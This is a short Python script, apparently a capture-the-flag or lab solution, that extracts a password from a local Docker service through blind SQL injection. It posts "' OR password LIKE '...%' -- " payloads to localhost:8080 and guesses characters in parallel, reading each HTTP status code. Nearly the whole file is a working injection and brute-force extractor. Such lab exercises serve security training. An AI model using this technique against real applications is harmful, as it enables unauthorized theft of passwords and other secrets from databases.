import string, requests
from wheatear_repeat import repeat

# first run docker-compose up in a terminal

@repeat
def get_flag(candidate_string: str) -> bool:
    escaped_string = candidate_string.replace('_', '\\_') # TODO make this a mapper function
    payload = f"' OR password LIKE '{escaped_string}%' -- "
    r = requests.post(
        'http://localhost:8080',
        json={
            'password': payload
        }
    )
    return r.status_code == 200

get_flag.legal_chars = string.ascii_letters + string.digits + '_-',
get_flag.max_length = 30
get_flag.parallelism = 5


if __name__ == '__main__':
    flag = get_flag()
    print()
    print(flag)
